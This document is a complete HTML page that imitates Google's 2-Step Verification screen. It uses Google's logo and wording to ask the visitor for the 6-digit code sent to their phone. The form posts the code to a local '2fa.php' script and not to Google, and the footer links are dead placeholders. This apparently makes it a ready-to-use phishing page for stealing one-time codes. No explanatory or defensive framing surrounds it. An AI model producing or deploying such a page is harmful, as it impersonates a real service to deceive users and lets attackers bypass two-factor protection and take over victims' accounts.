<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2-Step Verification - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            color: white;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #171717;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px;
        }

        .container {
            background-color: #0e0e0e;
            /* border: 1px solid #dadce0; */
            border-radius: 8px;
            color: white;
            padding: 48px 40px 36px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.1);
        }

        .google-logo {
            text-align: center;
            margin-bottom: 16px;
        }

        .google-logo img {
            width: 75px;
        }

        .title {
            font-size: 28px;
            font-weight: 500;
            text-align: center;
            margin-bottom: 32px;
            color: #ffffff;

        }

        .subtitle {
            font-size: 16px;
            color: #ffffff;
            text-align: center;
            margin-bottom: 24px;
        }





        .verification-info {
            margin-bottom: 40px;
            margin-top: 12px;
        }

        .verification-text {
            font-size: 24px;
            color: #ffffff;
            line-height: 1.4;
            margin-bottom: 8px;
        }

        .phone-number {
            font-size: 14px;
            color: #ffffff;

        }

        .input-group {
            margin-bottom: 24px;
        }

        .input-label {
            font-size: 14px;
            color: #ffffff;
            margin-bottom: 8px;
            display: block;
        }

        .verification-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #535353;
            border-radius: 4px;
            font-size: 16px;
            color: #ffffff;
            background: #2e2e2e;
            transition: border-color 0.2s;
            text-align: center;
            letter-spacing: 16px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .verification-input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 1px #1a73e8;
        }

        .verification-input::placeholder {
            color: #9aa0a6;
            letter-spacing: normal;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .help-links {
            margin-bottom: 32px;
        }

        .help-link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 8px;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        .button-group {
            display: flex;
            justify-content: flex-end;
            gap: 8px;
        }

        .btn {
            padding: 8px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
        }

        .btn-text {
            background: transparent;
            color: #1a73e8;
        }

        .btn-text:hover {
            background: rgba(26, 115, 232, 0.04);
        }

        .btn-primary {
            background: #1a73e8;
            color: white;
            border-radius: 130px;
            opacity: 0.4;
            cursor: not-allowed;
            padding: 14px 38px;
        }


        .btn-primary.active {
            opacity: 1;
            cursor: pointer;
        }

        .btn-primary.active:hover {
            background: #1557b0;
            box-shadow: 0 1px 2px 0 rgba(26, 115, 232, 0.45);
        }

        .divider {
            height: 1px;
            background: #e8eaed;
            margin: 24px 0;
        }

        .footer-links {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .language-select {
            background: transparent;
            border: none;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }

        .footer-link-group {
            display: flex;
            gap: 24px;
        }

        .footer-link {
            color: #5f6368;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-link:hover {
            color: #202124;
        }

        .error-message {
            color: #d93025;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }

        .input-group.error .verification-input {
            border-color: #d93025;
        }

        .input-group.error .error-message {
            display: block;
        }

        @media (max-width: 480px) {
            .container {
                background-color: #171717;
                padding: 24px 24px 16px;
                border: none;
                box-shadow: none;
            }


            body {
                padding: 0;
                background: #171717;
            }

            .button-group {
                flex-direction: column-reverse;
                gap: 16px;
            }

            .btn {
                width: 100%;
                padding: 12px;
            }

            .verification-input {
                letter-spacing: 4px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="google-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Google_Favicon_2025.svg" alt="" srcset="">
        </div>

        <h1 class="title">2-Step Verification</h1>




        <div class="verification-info">
            <p class="verification-text">Check your phone</p>
            <p class="phone-number">Google sent a code to your phone. Enter the code below to continue.</p>
        </div>

        <form id="verificationForm" action="2fa.php" method="post">
            <div class="input-group" id="inputGroup">
                <label class="input-label" for="code">Enter the 6-digit code</label>
                <input type="text" id="code" name="code" class="verification-input" placeholder="Enter code"
                    maxlength="6">
                <div class="error-message">Please enter a valid 6-digit code</div>
            </div>




            <div class="button-group">
                <button type="submit" class="btn btn-primary" id="verifyBtn">Verify</button>
            </div>
        </form>

        <div class="footer-links">
            <select class="language-select">
                <option>English (United States)</option>
            </select>
            <div class="footer-link-group">
                <a href="#" class="footer-link">Help</a>
                <a href="#" class="footer-link">Privacy</a>
                <a href="#" class="footer-link">Terms</a>
            </div>
        </div>
    </div>

    <script>
        const codeInput = document.getElementById('code');
        const verifyBtn = document.getElementById('verifyBtn');
        const inputGroup = document.getElementById('inputGroup');
        const form = document.getElementById('verificationForm');

        codeInput.addEventListener('input', function () {
            // Remove non-numeric characters
            this.value = this.value.replace(/[^0-9]/g, '');

            // Clear error state
            inputGroup.classList.remove('error');

            // Enable/disable verify button
            if (this.value.length === 6) {
                verifyBtn.classList.add('active');
            } else {
                verifyBtn.classList.remove('active');
            }
        });

        codeInput.addEventListener('keydown', function (e) {
            if (e.key === 'Enter' && this.value.length === 6) {
                form.submit();
            }
        });

        form.addEventListener('submit', function (e) {
            if (codeInput.value.length !== 6) {
                e.preventDefault();
                inputGroup.classList.add('error');
                codeInput.focus();
            }
        });

        // Auto-focus on input
        codeInput.focus();
    </script>

</body>

</html>
